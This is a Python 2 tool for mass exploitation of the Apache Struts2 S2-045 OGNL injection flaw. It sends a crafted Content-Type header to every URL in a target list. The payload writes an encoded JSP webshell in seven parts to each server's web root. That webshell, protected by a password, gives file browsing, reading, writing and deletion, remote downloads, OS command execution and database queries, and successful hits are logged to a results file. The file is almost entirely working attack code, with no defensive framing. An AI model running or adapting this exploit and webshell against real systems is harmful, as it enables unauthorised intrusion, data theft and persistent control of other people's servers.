#!/usr/bin/env python
# -*- coding: utf-8 -*-
# ------------------------------------------------------------------------------
# Name:        struts2 045 exploit tools
# Author:      pirogue
# Created:     2017-3-10 00:40:50
# Site:        [url=http://www.pirogue.org]http://www.pirogue.org[/url]
# useage:      python pi_struts2-045.py xxx.txt 5
# ------------------------------------------------------------------------------


import urllib2
import sys
import time
from multiprocessing.dummy import Pool as ThreadPool
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers

reload(sys)
sys.setdefaultencoding = 'utf-8'


class Pi_Struts2_045(object):
    """init variables"""
    def __init__(self, sthreads, num):
        # self.surl = surl
        self.stime = time.strftime("%Y-%m-%d%H%M%S", time.localtime())
        self.sthreads = sthreads
        self.datagen, self.header = multipart_encode(
            {"image1": open("tmp.txt", "rb")})

        self.header["User-agent"] = "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257 MicroMessenger/6.0.1 NetType/WIFI"

        self.webshell_txt_1 = '%3C%25%21%0D%0AString%20Pwd%3D%22pi%22%3B%0D%0AString%20EC%28String%20s%2CString%20c%29throws%20Exception%7Breturn%20s%3B%7D%2F%2Fnew%20String%28s.getBytes%28%22ISO-8859-1%22%29%2Cc%29%3B%7D%0D%0AConnection%20GC%28String%20s%29throws%20Exception%7BString%5B%5D%20x%3Ds.trim%28%29.split%28%22%5Cr%5Cn%22%29%3BClass.forName%28x%5B0%5D.trim%28%29%29.newInstance%28%29%3B%0D%0AConnection%20c%3DDriverManager.getConnection%28x%5B1%5D.trim%28%29%29%3Bif%28x.length%3E2%29%7Bc.setCatalog%28x%5B2%5D.trim%28%29%29%3B%7Dreturn%20c%3B%7D%0D%0Avoid%20AA%28StringBuffer%20sb%29throws%20Exception%7BFile%20r%5B%5D%3DFile.listRoots%28%29%3Bfor%28int%20i%3D0%3Bi%3Cr.length%3Bi%2B%2B%29%7Bsb.append%28r%5Bi%5D.toString%28%29.substring%280%2C2%29%29%3B%7D%7D%0D%0Avoid%20BB%28String%20s%2CStringBuffer%20sb%29throws%20Exception%7BFile%20oF%3Dnew%20File%28s%29%2Cl%5B%5D%3DoF.listFiles%28%29%3BString%20sT%2C%20sQ%2CsF%3D%22%22%3Bjava.util.Date%20dt%3B%0D%0ASimpleDateFormat%20fm%3Dnew%20SimpleDateFormat%28%22yyyy-MM-dd%20HH%3Amm%3Ass%22%29%3Bfor%28int%20i%3D0%3Bi%3Cl.length%3Bi%2B%2B%29%7Bdt%3Dnew%20java.util.Date%28l%5Bi%5D.lastModified%28%29%29%3B%0D%0AsT%3Dfm.format%28dt%29%3BsQ%3Dl%5Bi%5D.canRead%28%29%3F%22R%22%3A%22%22%3BsQ%2B%3Dl%5Bi%5D.canWrite%28%29%3F%22%20W%22%3A%22%22%3Bif%28l%5Bi%5D.isDirectory%28%29%29%7Bsb.append%28l%5Bi%5D.getName%28%29%2B%22%2F%5Ct%22%2BsT%2B%22%5Ct%22%2Bl%5Bi%5D.length%28%29%2B%22%5Ct%22%2BsQ%2B%22%5Cn%22%29%3B%7D%25%3E'
        self.webshell_txt_2 = '%3C%25%21%20else%7BsF%2B%3Dl%5Bi%5D.getName%28%29%2B%22%5Ct%22%2BsT%2B%22%5Ct%22%2Bl%5Bi%5D.length%28%29%2B%22%5Ct%22%2BsQ%2B%22%5Cn%22%3B%7D%7Dsb.append%28sF%29%3B%7D%0D%0Avoid%20EE%28String%20s%29throws%20Exception%7BFile%20f%3Dnew%20File%28s%29%3Bif%28f.isDirectory%28%29%29%7BFile%20x%5B%5D%3Df.listFiles%28%29%3B%0D%0Afor%28int%20k%3D0%3Bk%3Cx.length%3Bk%2B%2B%29%7Bif%28%21x%5Bk%5D.delete%28%29%29%7BEE%28x%5Bk%5D.getPath%28%29%29%3B%7D%7D%7Df.delete%28%29%3B%7D%0D%0Avoid%20FF%28String%20s%2CHttpServletResponse%20r%29throws%20Exception%7Bint%20n%3Bbyte%5B%5D%20b%3Dnew%20byte%5B512%5D%3Br.reset%28%29%3B%0D%0AServletOutputStream%20os%3Dr.getOutputStream%28%29%3BBufferedInputStream%20is%3Dnew%20BufferedInputStream%28new%20FileInputStream%28s%29%29%3B%0D%0Aos.write%28%28%22-%3E%22%2B%22%7C%22%29.getBytes%28%29%2C0%2C3%29%3Bwhile%28%28n%3Dis.read%28b%2C0%2C512%29%29%21%3D-1%29%7Bos.write%28b%2C0%2Cn%29%3B%7Dos.write%28%28%22%7C%22%2B%22%3C-%22%29.getBytes%28%29%2C0%2C3%29%3Bos.close%28%29%3Bis.close%28%29%3B%7D%0D%0Avoid%20GG%28String%20s%2C%20String%20d%29throws%20Exception%7BString%20h%3D%220123456789ABCDEF%22%3Bint%20n%3BFile%20f%3Dnew%20File%28s%29%3Bf.createNewFile%28%29%3B%0D%0AFileOutputStream%20os%3Dnew%20FileOutputStream%28f%29%3Bfor%28int%20i%3D0%3Bi%3Cd.length%28%29%3Bi%2B%3D2%29%0D%0A%7Bos.write%28%28h.indexOf%28d.charAt%28i%29%29%3C%3C4%7Ch.indexOf%28d.charAt%28i%2B1%29%29%29%29%3B%7Dos.close%28%29%3B%7D%0D%0Avoid%20HH%28String%20s%2CString%20d%29throws%20Exception%7BFile%20sf%3Dnew%20File%28s%29%2Cdf%3Dnew%20File%28d%29%3Bif%28sf.isDirectory%28%29%29%7Bif%28%21df.exists%28%29%29%7Bdf.mkdir%28%29%3B%7DFile%20z%5B%5D%3Dsf.listFiles%28%29%3B%0D%0Afor%28int%20j%3D0%3Bj%3Cz.length%3Bj%2B%2B%29%7BHH%28s%2B%22%2F%22%2Bz%5Bj%5D.getName%28%29%2Cd%2B%22%2F%22%2Bz%5Bj%5D.getName%28%29%29%3B%7D%0D%0A%7Delse%7BFileInputStream%20is%3Dnew%20FileInputStream%28sf%29%3BFileOutputStream%20os%3Dnew%20FileOutputStream%28df%29%3B%0D%0Aint%20n%3Bbyte%5B%5D%20b%3Dnew%20byte%5B512%5D%3Bwhile%28%28n%3Dis.read%28b%2C0%2C512%29%29%21%3D-1%29%7Bos.write%28b%2C0%2Cn%29%3B%7Dis.close%28%29%3Bos.close%28%29%3B%7D%7D%0D%0Avoid%20II%28String%20s%2CString%20d%29throws%20Exception%7BFile%20sf%3Dnew%20File%28s%29%2Cdf%3Dnew%20File%28d%29%3Bsf.renameTo%28df%29%3B%7Dvoid%20JJ%28String%20s%29throws%20Exception%7BFile%20f%3Dnew%20File%28s%29%3Bf.mkdir%28%29%3B%7D%25%3E'
        self.webshell_txt_3 = '%3C%25%21void%20KK%28String%20s%2CString%20t%29throws%20Exception%7BFile%20f%3Dnew%20File%28s%29%3BSimpleDateFormat%20fm%3Dnew%20SimpleDateFormat%28%22yyyy-MM-dd%20HH%3Amm%3Ass%22%29%3B%0D%0Ajava.util.Date%20dt%3Dfm.parse%28t%29%3Bf.setLastModified%28dt.getTime%28%29%29%3B%7D%0D%0Avoid%20LL%28String%20s%2C%20String%20d%29throws%20Exception%7BURL%20u%3Dnew%20URL%28s%29%3Bint%20n%3BFileOutputStream%20os%3Dnew%20FileOutputStream%28d%29%3B%0D%0AHttpURLConnection%20h%3D%28HttpURLConnection%29u.openConnection%28%29%3BInputStream%20is%3Dh.getInputStream%28%29%3Bbyte%5B%5D%20b%3Dnew%20byte%5B512%5D%3B%0D%0Awhile%28%28n%3Dis.read%28b%2C0%2C512%29%29%21%3D-1%29%7Bos.write%28b%2C0%2Cn%29%3B%7Dos.close%28%29%3Bis.close%28%29%3Bh.disconnect%28%29%3B%7D%0D%0Avoid%20MM%28InputStream%20is%2C%20StringBuffer%20sb%29throws%20Exception%7BString%20l%3BBufferedReader%20br%3Dnew%20BufferedReader%28new%20InputStreamReader%28is%29%29%3B%0D%0Awhile%28%28l%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28l%2B%22%5Cr%5Cn%22%29%3B%7D%7D%0D%0Avoid%20NN%28String%20s%2CStringBuffer%20sb%29throws%20Exception%7BConnection%20c%3DGC%28s%29%3BResultSet%20r%3Dc.getMetaData%28%29.getCatalogs%28%29%3B%0D%0Awhile%28r.next%28%29%29%7Bsb.append%28r.getString%281%29%2B%22%5Ct%22%29%3B%7Dr.close%28%29%3Bc.close%28%29%3B%7D%0D%0Avoid%20OO%28String%20s%2CStringBuffer%20sb%29throws%20Exception%7BConnection%20c%3DGC%28s%29%3BString%5B%5D%20t%3D%7B%22TABLE%22%7D%3BResultSet%20r%3Dc.getMetaData%28%29.getTables%20%28null%2Cnull%2C%22%25%22%2Ct%29%3B%0D%0Awhile%28r.next%28%29%29%7Bsb.append%28r.getString%28%22TABLE%5FNAME%22%29%2B%22%5Ct%22%29%3B%7Dr.close%28%29%3Bc.close%28%29%3B%7D%25%3E'
        self.webshell_txt_4 = '%3C%25%21void%20PP%28String%20s%2CStringBuffer%20sb%29throws%20Exception%7BString%5B%5D%20x%3Ds.trim%28%29.split%28%22%5Cr%5Cn%22%29%3BConnection%20c%3DGC%28s%29%3B%0D%0AStatement%20m%3Dc.createStatement%281005%2C1007%29%3BResultSet%20r%3Dm.executeQuery%28%22select%20%2A%20from%20%22%2Bx%5B3%5D%29%3BResultSetMetaData%20d%3Dr.getMetaData%28%29%3B%0D%0Afor%28int%20i%3D1%3Bi%3C%3Dd.getColumnCount%28%29%3Bi%2B%2B%29%7Bsb.append%28d.getColumnName%28i%29%2B%22%20%28%22%2Bd.getColumnTypeName%28i%29%2B%22%29%5Ct%22%29%3B%7Dr.close%28%29%3Bm.close%28%29%3Bc.close%28%29%3B%7D%0D%0Avoid%20QQ%28String%20cs%2CString%20s%2CString%20q%2CStringBuffer%20sb%29throws%20Exception%7Bint%20i%3BConnection%20c%3DGC%28s%29%3BStatement%20m%3Dc.createStatement%281005%2C1008%29%3B%0D%0Atry%7BResultSet%20r%3Dm.executeQuery%28q%29%3BResultSetMetaData%20d%3Dr.getMetaData%28%29%3Bint%20n%3Dd.getColumnCount%28%29%3Bfor%28i%3D1%3Bi%3C%3Dn%3Bi%2B%2B%29%7Bsb.append%28d.getColumnName%28i%29%2B%22%5Ct%7C%5Ct%22%29%3B%0D%0A%7Dsb.append%28%22%5Cr%5Cn%22%29%3Bwhile%28r.next%28%29%29%7Bfor%28i%3D1%3Bi%3C%3Dn%3Bi%2B%2B%29%7Bsb.append%28EC%28r.getString%28i%29%2Ccs%29%2B%22%5Ct%7C%5Ct%22%29%3B%7Dsb.append%28%22%5Cr%5Cn%22%29%3B%7Dr.close%28%29%3B%7D%0D%0Acatch%28Exception%20e%29%7Bsb.append%28%22Result%5Ct%7C%5Ct%5Cr%5Cn%22%29%3Btry%7Bm.executeUpdate%28q%29%3Bsb.append%28%22Execute%20Successfully%21%5Ct%7C%5Ct%5Cr%5Cn%22%29%3B%0D%0A%7Dcatch%28Exception%20ee%29%7Bsb.append%28ee.toString%28%29%2B%22%5Ct%7C%5Ct%5Cr%5Cn%22%29%3B%7D%7Dm.close%28%29%3Bc.close%28%29%3B%7D%0D%0A%25%3E'
        self.webshell_txt_5 = '%3C%25%0D%0AString%20cs%3Drequest.getParameter%28%22z0%22%29%2B%22%22%3Brequest.setCharacterEncoding%28cs%29%3Bresponse.setContentType%28%22text%2Fhtml%3Bcharset%3D%22%2Bcs%29%3B%0D%0AString%20Z%3DEC%28request.getParameter%28Pwd%29%2B%22%22%2Ccs%29%3BString%20z1%3DEC%28request.getParameter%28%22z1%22%29%2B%22%22%2Ccs%29%3BString%20z2%3DEC%28request.getParameter%28%22z2%22%29%2B%22%22%2Ccs%29%3B%0D%0AStringBuffer%20sb%3Dnew%20StringBuffer%28%22%22%29%3Btry%7Bsb.append%28%22-%3E%22%2B%22%7C%22%29%3B%0D%0Aif%28Z.equals%28%22A%22%29%29%7BString%20s%3Dnew%20File%28application.getRealPath%28request.getRequestURI%28%29%29%29.getParent%28%29%3Bsb.append%28s%2B%22%5Ct%22%29%3Bif%28%21s.substring%280%2C1%29.equals%28%22%2F%22%29%29%7BAA%28sb%29%3B%7D%7D%0D%0Aelse%20if%28Z.equals%28%22B%22%29%29%7BBB%28z1%2Csb%29%3B%7Delse%20if%28Z.equals%28%22C%22%29%29%7BString%20l%3D%22%22%3BBufferedReader%20br%3Dnew%20BufferedReader%28new%20InputStreamReader%28new%20FileInputStream%28new%20File%28z1%29%29%29%29%3B%0D%0Awhile%28%28l%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28l%2B%22%5Cr%5Cn%22%29%3B%7Dbr.close%28%29%3B%7D%25%3E'
        self.webshell_txt_6 = '%3C%25else%20if%28Z.equals%28%22D%22%29%29%7BBufferedWriter%20pi%3Dnew%20BufferedWriter%28new%20OutputStreamWriter%28new%20FileOutputStream%28new%20File%28z1%29%29%29%29%3B%0D%0Api.write%28z2%29%3Bpi.close%28%29%3Bsb.append%28%221%22%29%3B%7Delse%20if%28Z.equals%28%22E%22%29%29%7BEE%28z1%29%3Bsb.append%28%221%22%29%3B%7Delse%20if%28Z.equals%28%22F%22%29%29%7BFF%28z1%2Cresponse%29%3B%7D%0D%0Aelse%20if%28Z.equals%28%22G%22%29%29%7BGG%28z1%2Cz2%29%3Bsb.append%28%221%22%29%3B%7Delse%20if%28Z.equals%28%22H%22%29%29%7BHH%28z1%2Cz2%29%3Bsb.append%28%221%22%29%3B%7Delse%20if%28Z.equals%28%22I%22%29%29%7BII%28z1%2Cz2%29%3Bsb.append%28%221%22%29%3B%7D%0D%0Aelse%20if%28Z.equals%28%22J%22%29%29%7BJJ%28z1%29%3Bsb.append%28%221%22%29%3B%7Delse%20if%28Z.equals%28%22K%22%29%29%7BKK%28z1%2Cz2%29%3Bsb.append%28%221%22%29%3B%7Delse%20if%28Z.equals%28%22L%22%29%29%7BLL%28z1%2Cz2%29%3Bsb.append%28%221%22%29%3B%7D%0D%0Aelse%20if%28Z.equals%28%22M%22%29%29%7BString%5B%5D%20c%3D%7Bz1.substring%282%29%2Cz1.substring%280%2C2%29%2Cz2%7D%3BProcess%20p%3DRuntime.getRuntime%28%29.exec%28c%29%3B%0D%0AMM%28p.getInputStream%28%29%2Csb%29%3BMM%28p.getErrorStream%28%29%2Csb%29%3B%7Delse%20if%28Z.equals%28%22N%22%29%29%7BNN%28z1%2Csb%29%3B%7Delse%20if%28Z.equals%28%22O%22%29%29%7BOO%28z1%2Csb%29%3B%7D%0D%0Aelse%20if%28Z.equals%28%22P%22%29%29%7BPP%28z1%2Csb%29%3B%7Delse%20if%28Z.equals%28%22Q%22%29%29%7BQQ%28cs%2Cz1%2Cz2%2Csb%29%3B%7D%0D%0A%7Dcatch%28Exception%20e%29%7Bsb.append%28%22ERROR%22%2B%22%3A%2F%2F%20%22%2Be.toString%28%29%29%3B%7Dsb.append%28%22%7C%22%2B%22%3C-%22%29%3Bout.print%28sb.toString%28%29%29%3B%0D%0A%25%3E'
        self.webshell_txt_7 = '%3C%25%40page%20import%3D%22java.io.%2A%2Cjava.util.%2A%2Cjava.net.%2A%2Cjava.sql.%2A%2Cjava.text.%2A%22%25%3E%3C%25%40include%20file%3D%221t00ls.jsp%22%25%3E%3C%25%40include%20file%3D%222t00ls.jsp%22%25%3E%3C%25%40include%20file%3D%223t00ls.jsp%22%25%3E%3C%25%40include%20file%3D%224t00ls.jsp%22%25%3E%3C%25%40include%20file%3D%225t00ls.jsp%22%25%3E%3C%25%40include%20file%3D%226t00ls.jsp%22%25%3E'
        self.num = str(num)
        self.header["Content-Type"] = "%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ccccc='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')).(#shell='" + eval("self.webshell_txt_"+ self.num)+"').(new java.io.BufferedWriter(new java.io.FileWriter(#path+'/"+self.num+"t00ls.jsp').append(new java.net.URLDecoder().decode(#shell,'UTF-8'))).close()).(#cmd='echo \\\"write file to '+#path+'/"+ self.num +"t00ls.jsp\\\"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"


    def spost_exp(self, ck_url):
        """post payload"""
        # print self.header
        try:
            register_openers()
            request_s2_045 = urllib2.Request(ck_url, self.datagen, self.header)
            response_s2_045 = urllib2.urlopen(request_s2_045, timeout=5)
            res = response_s2_045.read()
            self.ensure(res, ck_url)
        except:
            print "error--->" + ck_url


    def ensure(self, res, shost):
        """output struts2 045 res"""
        print res
        # stime = time.strftime("%Y-%m-%d%H%M%S", time.localtime())
        if "6t00ls" in res:
            with open(self.stime+'result.txt', 'a') as f_s:
                f_s.write(res + shost)


    def check_url(self, url_txt):
        'check url list'
        with open(url_txt, 'rb') as c_f:
            # print type(c_f)
            pool = ThreadPool(self.sthreads)
            pool.map(self.spost_exp, c_f)
            pool.close()
            pool.join()
            # for url in c_f:
            #     self.spost_exp(stime ,url)
    # def read_file(self):
    #     """read webshell content to str"""
    #     file_object = open('caidao.jsp', 'rb').read()
    #     print file_object


def main():
    """useage: python pi_struts2-045.py xxx.txt 5"""
    for i in range(1, 8):
        exploit = Pi_Struts2_045(int(sys.argv[2]), i)
        exploit.check_url(str(sys.argv[1]))


if __name__ == '__main__':
    main()